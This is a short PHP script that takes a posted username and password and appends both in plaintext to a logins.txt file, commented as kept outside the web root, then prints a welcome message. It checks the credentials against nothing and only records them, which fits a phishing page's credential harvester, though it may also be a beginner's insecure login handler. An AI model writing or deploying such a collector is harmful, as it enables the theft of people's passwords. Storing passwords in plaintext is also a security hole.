<?php
if ($_SERVER["REQUEST_METHOD"] == "POST") {
    $username = htmlspecialchars($_POST['username']);
    $password = htmlspecialchars($_POST['pswrd']);

    // Save to file OUTSIDE web root
    $filePath = "/home/YOURUSERNAME/logins.txt";

    if ($file = fopen($filePath, "a")) {
        fwrite($file, "Username: $username, Password: $password\n");
        fclose($file);
    }

    echo "<h1>Welcome, $username!</h1>";
} else {
    echo "Invalid request.";
}
?>